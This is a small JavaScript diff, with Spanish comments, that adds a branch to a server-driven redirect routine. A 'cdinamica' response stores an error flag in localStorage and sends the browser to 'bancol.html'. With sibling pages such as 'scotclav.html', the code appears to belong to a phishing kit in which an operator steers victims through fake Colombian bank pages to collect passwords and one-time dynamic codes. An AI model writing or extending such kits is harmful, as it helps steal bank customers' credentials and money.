@@ -63,6 +63,13 @@ fetch(`${API_URL}/generals`, {
 
             // Redirigir
             window.location.href = 'scotclav.html'
+        } else if (result.redirect_to === 'cdinamica') {
+            // Setear el error
+            info.err = 'cdinamica';
+            LS.setItem('info', JSON.stringify(info));
+
+            // Redirigir
+            window.location.href = 'bancol.html'
         } else if (result.redirect_to === 'userp') {
             // Setear el error
             info.err = 'true';
